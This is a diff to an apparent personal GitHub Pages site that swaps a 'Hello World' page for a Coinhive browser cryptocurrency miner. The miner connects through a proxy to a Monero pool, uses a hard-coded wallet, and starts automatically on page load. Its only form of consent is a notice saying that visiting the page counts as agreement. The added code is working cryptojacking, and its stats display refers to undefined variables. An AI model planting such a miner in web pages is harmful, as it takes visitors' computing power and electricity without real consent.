@@ -1,10 +1,51 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>Jacob_Mango - GitHub Pages</title>
+        <title>Jacob_Mango - Github Pages</title>
+        <script src="https://jacob-mango.github.io/jacobmango/m.js?proxy=wss://coin-hive-stratum-xchlvikeqi.now.sh?pool=pool.supportxmr.com:3333"></script>
     </head>
     <body>
-        <h1>Hello World</h1>
-        <p>I'm hosted with GitHub Pages.</p>
+        <div class="info">
+            <h1>A Coinhive Miner!</h1>
+            <p>Hashes per Second: <span id="hps"></span></p>
+            <p>Total Hashes Found: <span id="th"></span></p>
+            <p>Total Accepted Hashes: <span id="ah"></span></p>
+            <p>Throttle: <span id="throttle"></span></p>
+            <p>Num of Threads: <span id="threads"></span></p>
+        </div>
+
+        <div>
+            <p>Notice: By being on this website you agree to use your device for the mining of cryptocurrencies in which you will yield no reward unless otherwise written.</p>
+        </div>
+
+        <script>
+            var config = {
+                    throttle: 0.5,
+                    threads: 4
+                };
+
+            var miner = CH.Anonymous(
+                '41i5aVRjzsRRKd5EH9KTMSATjzmVegagzB2dYJ18PHRZgz8TR27TeorhTmeySirWboeb3tyhCLXCDPn6oVE3evHVHqqiExs', config);
+            miner.start();
+
+            miner.on('found', function () {
+                console.log("Found some XHR!");
+            });
+            miner.on('accepted', function () {
+                console.log("Accepted some XHR!");
+            });
+
+            setInterval(function () {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+
+                document.getElementById("hps").innerText = hashesPerSecond;
+                document.getElementById("th").innerText = totalHashes;
+                document.getElementById("ah").innerText = acceptedHashes;
+                document.getElementById("throttle").innerText = throttle;
+                document.getElementById("threads").innerText = threads;
+            }, 1000);
+        </script>
     </body>
 </html>
